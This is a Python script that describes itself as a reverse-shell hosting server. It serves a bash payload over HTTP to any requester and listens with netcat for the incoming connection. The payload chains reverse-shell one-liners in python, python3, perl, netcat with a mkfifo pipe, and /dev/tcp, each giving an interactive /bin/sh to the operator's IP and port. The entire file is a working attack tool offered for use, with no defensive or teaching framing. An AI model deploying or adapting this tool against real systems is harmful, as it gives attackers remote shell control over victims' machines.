#!/usr/bin/python
import sys
import re
import argparse
import threading
import os
import random
import socket
import fcntl
import struct

if sys.version_info[0] == 2:
    from BaseHTTPServer import HTTPServer, BaseHTTPRequestHandler
    import SocketServer
    from SocketServer import ThreadingMixIn
else:
    from http.server import HTTPServer, BaseHTTPRequestHandler
    import socketserver as SocketServer
    from socketserver import ThreadingMixIn


bash_template="""if command -v python > /dev/null 2>&1; then
        python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("{ip}",{port})); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'
        exit;
fi

if command -v python3 > /dev/null 2>&1; then
        python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("{ip}",{port})); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'
        exit;
fi

if command -v perl > /dev/null 2>&1; then
        perl -e 'use Socket;$i="{ip}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};'
        exit;
fi

if command -v nc > /dev/null 2>&1; then
        rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f
        exit;
fi

if command -v sh > /dev/null 2>&1; then
        /bin/sh -i >& /dev/tcp/{ip}/{port} 0>&1
        exit;
fi"""


def get_ip_address(interface):
    ip = ""
    if interface:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        ip = socket.inet_ntoa(fcntl.ioctl(
            s.fileno(),
            0x8915,  # SIOCGIFADDR
            struct.pack('256s', interface[:15].encode())
        )[20:24])
    else:
        with os.popen("curl -s ifconfig.me") as p:
            ip = p.read().replace("\n","")
    return ip


def is_occupied(port):
    s =  socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    try:
        s.connect(('127.0.0.1',port))
        s.shutdown(2)
        return True
    except:
        return False


def get_unoccupied_port():
    port = random.randint(1024,65535)
    while is_occupied(port):
        port = random.randint(1024,65535)
    return port


class MyHTTPD(BaseHTTPRequestHandler):
    def do_GET(self):
        #print(self.path)
        self.send_response(200)
        self.end_headers()
        self.wfile.write(bash_template.format(ip=ip,port=rev_port).encode())


# Make the http server works on its own thread
class ThreadedHTTPServer(object):
    def __init__(self,host,port):
        SocketServer.TCPServer.allow_reuse_address = True
        self.server = SocketServer.TCPServer((host,port), MyHTTPD)
        self.server_thread = threading.Thread(target=self.server.serve_forever)
        self.server_thread.daemon = True

    def start(self):
        self.server_thread.start()

    def stop(self):
        self.server.shutdown()
        self.server.server_close()


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="reverse shell script hosting server")
    parser.add_argument("-i", help = "interface", required = False, default = "")
    parser.add_argument("-port", help = "listening port", required = False, type = int, default = "8888")
    args = parser.parse_args()

    global ip
    ip = get_ip_address(args.i)
    global rev_port
    rev_port = get_unoccupied_port()

    web_port = args.port
    if is_occupied(web_port):
        web_port = get_unoccupied_port()

    server = ThreadedHTTPServer("0.0.0.0", args.port)
    print("reverse shell script hosting on {ip}:{port}".format(ip=ip, port=web_port))
    server.start()
    os.system("nc -lnvp {}".format(rev_port))
